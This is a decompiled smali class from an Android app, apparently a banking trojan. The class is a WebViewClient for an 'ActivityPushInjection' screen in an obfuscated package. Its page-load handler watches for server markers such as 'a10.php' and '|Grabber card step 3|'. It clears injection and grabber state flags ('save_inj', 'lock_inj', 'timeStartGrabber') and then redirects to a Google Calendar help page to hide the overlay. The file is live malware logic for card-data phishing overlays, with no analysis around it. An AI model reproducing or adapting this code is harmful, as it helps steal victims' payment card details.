.class Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;
.super Landroid/webkit/WebViewClient;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "for"
.end annotation


# instance fields
.field final synthetic fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;


# direct methods
.method private constructor <init>(Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;)V
    .registers 2

    iput-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$fddo;)V
    .registers 3

    invoke-direct {p0, p1}, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;-><init>(Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;)V

    return-void
.end method


# virtual methods
.method public onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .registers 13

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object v0, v0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "Start Activity Inject"

    invoke-virtual {v0, v1, p2}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "a10.php"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    const-string v1, "false"

    const-string v2, "name"

    const-string v3, "timeStartGrabber"

    const-string v4, "lock_inj"

    const-string v5, "save_inj"

    const-string v6, "STOP"

    const-string v7, "https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android"

    const-string v8, ""

    if-eqz v0, :cond_46

    invoke-virtual {p2, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_46

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v0, v5, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v0, v4, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v0, v3, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object v9, v0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v9, v0, v2, v1}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p1, v7}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :cond_46
    invoke-virtual {p2, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_54

    invoke-virtual {p1, v7}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    :cond_54
    const-string v0, "exitdagjhadfjedgjsfhexitlgdgsfhafg"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_64

    invoke-virtual {p1, v7}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    :cond_64
    const-string p1, "|Grabber card step 3|"

    invoke-virtual {p2, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_88

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object p2, p1, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1, v5, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object p2, p1, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1, v4, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object p2, p1, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1, v3, v8}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection$for;->fddo:Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    iget-object p2, p1, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1, v2, v1}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_88
    return-void
.end method

.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .registers 3

    const/4 p1, 0x0

    return p1
.end method
